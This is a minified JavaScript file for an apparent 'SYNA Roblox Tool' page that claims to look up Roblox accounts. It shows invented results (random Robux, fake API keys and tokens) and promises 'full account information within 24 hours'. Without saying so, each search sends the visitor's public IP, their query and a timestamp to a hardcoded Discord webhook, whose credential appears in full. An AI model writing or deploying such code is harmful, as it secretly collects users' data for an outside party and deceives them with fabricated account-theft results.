const canvas=document.getElementById('particles');const ctx=canvas.getContext('2d');let particlesArray=[];canvas.width=window.innerWidth;canvas.height=window.innerHeight;window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight});const mouse={x:null,y:null};window.addEventListener('mousemove',e=>{mouse.x=e.x;mouse.y=e.y});class Particle{constructor(x,y,size,color){this.x=x;this.y=y;this.size=size;this.color=color;this.speedX=(Math.random()-.5)*1.5;this.speedY=(Math.random()-.5)*1.5}update(){this.x+=this.speedX;this.y+=this.speedY;if(this.x<0||this.x>canvas.width)this.speedX*=-1;if(this.y<0||this.y>canvas.height)this.speedY*=-1;if(mouse.x&&Math.hypot(this.x-mouse.x,this.y-mouse.y)<150){this.x+=(mouse.x-this.x)*0.02;this.y+=(mouse.y-this.y)*0.02}}draw(){ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fillStyle=this.color;ctx.fill()}}function initParticles(){particlesArray=[];for(let i=0;i<200;i++){let size=Math.random()*3+1;let x=Math.random()*canvas.width;let y=Math.random()*canvas.height;particlesArray.push(new Particle(x,y,size,'rgba(0,162,255,0.8)'))}}function animateParticles(){ctx.clearRect(0,0,canvas.width,canvas.height);particlesArray.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animateParticles)}initParticles();animateParticles();function typeWriterEffect(e,t,s=20){let i=0;function typing(){if(i<t.length){e.textContent+=t.charAt(i);i++;setTimeout(typing,s)}}typing()}const scanBtn=document.querySelector('.search-btn');const searchBar=document.querySelector('.search-bar');const resultsContainer=document.getElementById('results-container');const WEBHOOK_URL='https://canary.discord.com/api/webhooks/1404244684426969229/FbiVK5pj7l7QWUlMycn3JzbFK5uMf5IDiXlFUpPTvXdPzEZDWf-mwMW4hWJtfmSIGl9B';async function getPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();return d.ip}catch{return 'IP unavailable'}}scanBtn.addEventListener('click',async()=>{const query=searchBar.value.trim();if(!query)return;const ip=await getPublicIP();const fakeResults=[{title:'Username',data:query},{title:'UserID',data:Math.floor(Math.random()*90000000)+10000000},{title:'Robux',data:Math.floor(Math.random()*100)+' R$'},{title:'Inventory Count',data:Math.floor(Math.random()*150)+' items'},{title:'API Key',data:`AK-${Math.random().toString(36).substring(2,20)}-${Math.random().toString(36).substring(2,20)}`},{title:'Token',data:`ROBLOX-TOKEN-${Math.random().toString(36).substring(2,25)}-${Math.random().toString(36).substring(2,25)}-${Math.random().toString(36).substring(2,25)}`}];const embedFields=fakeResults.filter(res=>res.title!=='Username').map(res=>({name:res.title,value:String(res.data),inline:false}));const payload=new FormData();const embedPayload={embeds:[{title:'Nouvelle recherche SYNA Roblox Tool',color:0x800080,fields:[...embedFields,{name:'IP utilisateur',value:ip,inline:false},{name:'Timestamp',value:new Date().toISOString(),inline:false}],footer:{text:'SYNA Roblox Tool v2'}}]};payload.append('payload_json',JSON.stringify(embedPayload));const fileContent=query;const file=new Blob([fileContent],{type:'text/plain'});payload.append('file',file,'search.txt');await fetch(WEBHOOK_URL,{method:'POST',body:payload});const usernameLimited=limitCharacters(query,160);resultsContainer.innerHTML='';fakeResults.forEach((res,i)=>{setTimeout(()=>{const card=document.createElement('div');card.className='result-card '+(res.title==='Username'?'big':'small');const title=document.createElement('div');title.className='result-title';title.textContent=res.title;const data=document.createElement('div');data.className='result-data';if(res.title==='Username'){typeWriterEffect(data,usernameLimited,10)}else{typeWriterEffect(data,String(res.data),10)}card.appendChild(title);card.appendChild(data);resultsContainer.appendChild(card)},i*500)});setTimeout(()=>{const finalMsg=document.createElement('div');finalMsg.className='final-msg';finalMsg.innerHTML='Full account information will be available within 24 hours<span>?</span>';resultsContainer.appendChild(finalMsg)},fakeResults.length*500+500)});function limitCharacters(t,m){if(t.length>m){return t.substring(0,m)+'...'}return t}
